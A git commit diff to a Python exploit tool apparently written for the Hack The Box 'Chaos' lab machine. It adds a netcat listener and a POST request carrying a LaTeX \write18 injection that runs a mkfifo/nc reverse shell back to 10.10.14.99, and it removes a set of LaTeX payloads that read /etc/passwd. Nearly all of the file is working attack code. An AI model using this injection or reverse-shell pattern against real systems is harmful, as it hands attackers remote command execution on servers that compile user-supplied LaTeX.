faa52092dee5c3cb124058f37da2ebb7a8328fb0
Seyptoo <39600961+Seyptoo@users.noreply.github.com>
2019-02-15 18:29:05 +0100

    Update New.py

--- New.py
+++ New.py
@@ -1,10 +1,13 @@
 #coding:utf-8
 
 import sys
-import urllib2
-import socket
+import requests
+import nclib
 import options
 import re
+
+from optparse import *
+from nclib import TCPServer
 
 class IncorrectProgramException(Exception):
 	def __init__(self, OutputCondition=None):
@@ -12,14 +15,6 @@ class IncorrectProgramException(Exception):
 
 # This tool allows to exploit Latex without any problem.
 # You will also have the opportunity to do a reverse shell.
-
-ServicesPollers = {
-		"Reading-Files": {
-			"\input{/etc/passwd}":					False,
-			"\usepackage{verbatim}":				False,
-			"\+verbatiminput{/etc/passwd}":	False
-	}
-}
 
 def BertModel():
 	"""
@@ -37,25 +32,35 @@ def BertModel():
 	return values.
 
 	"""
+	ListenerPort = nclib.Netcat(listen=('', 9007))
+	ListenerPort.interact()
 
-	SettingsURL = options.URL
-	SettingsDATA = options.DATA
-	SettingsOSSH = options.OSSH
+def ExtensionModel():
+	"""
 
-	if(SettingsURL == None):
-		sys.exit("[!] Please put the URL with option '-u'.")
-	if(SettingsDATA == None):
-		sys.exit("[!] Please put the DATA with option '-d'.")
-	if(SettingsOSSH == None):
-		sys.exit("[!] Please put the DATA with option '-o'.")
+	This function will allow us to test conditions,
+	and to make the attack.
 
-	# So here we will test the variables and their values.
-	# It is a subjective criterion.
+	Parameters
+	----
+	None Parameters.
 
-	if(SettingsURL.startswith(("http://", "https://")) == False):
-		raise IncorrectProgramException("[!] Incorrect URL.")
-	if not(re.search('(\w+[=]+\w+[&]{0,})', SettingsDATA)):
-		raise IncorrectProgramException("[!] Incorrect DATA.")
+	Return
+	----
+	This function will
+	return values.
+
+	"""
+	if(options.URL.startswith(("http://", "https://")) == False):
+		raise IncorrectProgramException("URL is incorrect sorry :/")
+	if not(re.search('(\w+[=]+\w+[&]{0,})', options.DATA)):
+		raise IncorrectProgramException("DATA is incorrect sorry :/")
+	
+	# Testing all default in program.
+	# It's very simple code and efficase.
+
+	ArgumentDATA = {"content":"\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.99 9007 >/tmp/f}", "template":"test1"}
+	requests.post("http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php", data=ArgumentDATA)
 
 if __name__ == "__main__":
-	BertModel()
+	ExtensionModel(), BertModel()
